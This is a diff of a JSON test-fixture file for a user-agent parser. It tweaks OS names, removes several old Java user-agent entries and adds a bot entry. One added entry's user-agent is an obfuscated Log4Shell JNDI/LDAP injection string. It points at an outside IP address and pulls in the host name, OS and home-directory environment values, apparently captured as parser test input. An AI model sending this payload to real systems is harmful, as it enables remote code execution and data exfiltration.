@@ -23,7 +23,7 @@
       "bits": null
     },
     "os": {
-      "name": "Windows NT",
+      "name": "Windows",
       "marketingName": "Windows 2000",
       "version": "5.0.0",
       "manufacturer": "Microsoft",
@@ -78,186 +78,6 @@
       "name": "Java Standard Library",
       "modus": null,
       "version": "1.4.2",
-      "manufacturer": "Oracle",
-      "type": "library",
-      "isbot": false,
-      "bits": null
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/4.0 (Windows Me 4.90) Java/1.4.2_05"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": "Windows Desktop",
-      "marketingName": "Windows Desktop",
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": 0,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "desktop",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": "Windows ME",
-      "marketingName": "Windows ME",
-      "version": null,
-      "manufacturer": "Microsoft",
-      "bits": null
-    },
-    "client": {
-      "name": "Java Standard Library",
-      "modus": null,
-      "version": "1.4.2.05",
-      "manufacturer": "Oracle",
-      "type": "library",
-      "isbot": false,
-      "bits": null
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/4.0 (Windows 98 4.10) Java/1.4.2_03"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": "Windows Desktop",
-      "marketingName": "Windows Desktop",
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": 0,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "desktop",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": "Windows 98",
-      "marketingName": "Windows 98",
-      "version": "98.0.0",
-      "manufacturer": "Microsoft",
-      "bits": null
-    },
-    "client": {
-      "name": "Java Standard Library",
-      "modus": null,
-      "version": "1.4.2.03",
-      "manufacturer": "Oracle",
-      "type": "library",
-      "isbot": false,
-      "bits": null
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/4.0 (Windows 2003 5.2) Java/1.4.2_03"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": "Windows Desktop",
-      "marketingName": "Windows Desktop",
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": 0,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "desktop",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": "Windows 2003",
-      "marketingName": "Windows 2003",
-      "version": "2003.0.0",
-      "manufacturer": "Microsoft",
-      "bits": null
-    },
-    "client": {
-      "name": "Java Standard Library",
-      "modus": null,
-      "version": "1.4.2.03",
-      "manufacturer": "Oracle",
-      "type": "library",
-      "isbot": false,
-      "bits": null
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mozilla/4.0 (Windows 7 6.1) Java/1.6.0_27"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": "Windows Desktop",
-      "marketingName": "Windows Desktop",
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": 0,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "desktop",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": "Windows",
-      "marketingName": "Windows 7",
-      "version": "7.0.0",
-      "manufacturer": "Microsoft",
-      "bits": null
-    },
-    "client": {
-      "name": "Java Standard Library",
-      "modus": null,
-      "version": "1.6.0.27",
       "manufacturer": "Oracle",
       "type": "library",
       "isbot": false,
@@ -361,6 +181,51 @@
   },
   {
     "headers": {
+      "user-agent": "bot/0.6b (windows nt; java hotspot(tm) server 64-bit vm; +http://www.daniel-nowak-ug.de) resource description engine 0.3b"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": "Windows Desktop",
+      "marketingName": "Windows Desktop",
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": 0,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "desktop",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": "Windows NT",
+      "marketingName": "Windows NT",
+      "version": null,
+      "manufacturer": "Microsoft",
+      "bits": null
+    },
+    "client": {
+      "name": "Java Standard Library",
+      "modus": null,
+      "version": null,
+      "manufacturer": "Oracle",
+      "type": "library",
+      "isbot": false,
+      "bits": null
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
       "user-agent": "${${:-j}${:-n}${:-d}${:-i}:${:-l}${:-d}${:-a}${:-p}://143.198.244.73/dn=gAAAAABjIZkFL1TiGguY0z5dZLvTmNEYl4Zsok_RKlFNEOixvT2PmrqZP6hfoI-p5nRvIoPwABw3MKmgEPYc4nU6goKCzm3wk4UZmGk9VlPH5OcsywuzxWP9DUChdcpSpYAF1IGG06vMsf9YuQpX50OGHGF764FnriOzccg9rPYDA7nDjjvkZP0Lo1gOI0MtokbzLW4r-HZ4xXzcgcc7pt2fPdXIasqOm0_WYzxmiGu3YOaIP_emel4otzRjJ-NwY1hDLvpn73bognqO-Ejth_sQicIjygfYNfvhfTdtP8oG3V0CbtfUpA2CInzs8PL9KUZAe1zcYJ3_VAMVUHNvwB-DILvvcAc7UVI07KTyCTynhDOJ3IUyofVAN9ssmL-VTvKd8t3MYj2eDawm16p1G1yh8JzpbBKRIfdCBbSLrzVxqIC2evSHzcomObdY2j8RHYM4hze_N43vNi77IWzQ4SzLYweABkBrtx1BgRiXubzYxX5cAkrBCnfA2mjg8LOM6ysHwvRV-Akw3aH4t2m-7TX-wBjybNv4T3LXPN3oOpKUEgzP1YzOYz3BQUflRWxCf87Hk4fzh-uGMeo0kNhAct8DJBywxvcch5jL4H4RdnB0ZavfA7YcuATLHqk_yPv0r9i3uen5F5C15dt4_AaXPzaUdL64097_t_ipoVp2qus_mogyY3nTr6pHhU9uSZsx4rQp75jrZlTgcVpomKATzXXVT1KrKN6IIx4NLYv0akN0YT5ibKqcCFsLq-JB7ckjmtEDkkHXhfgw2l0fJmGYNx4ih1lOPlyqnL5glOafgoZAVY2o7caZlGn8DdrpE0diyPjMvcN_DofziIFu3iFNaqzXi_ZQr-EmB1oer13Z-O9btulZ6n_0cxp1nHTpbRQA4Ez0ekly5jEu1YZjc6xC31U3QYnwWFu7cGbjtUM3F-Js5F7xCKwJo1SlPKGpBYQOdsBtXb9oYquZUtjAYrPRpmaSnMdKwGs5zPcsLlA1q-sm1QqycUb8UpMQ2EnUYWAEDrxQ5aWBSSkERjHvA7k_ma3c1sugizukhw==,cn='${hostName}',ou='${java:os}',ca1='${ENV:HOME:-Non}',ca2='${log4j:configParentLocation}',wca2='${ENV:HOMEPATH:-Non}'}"
     },
     "device": {
@@ -399,7 +264,7 @@
       "bits": null
     },
     "engine": {
-      "name": null,
+      "name": "Text",
       "version": null,
       "manufacturer": "unknown"
     }
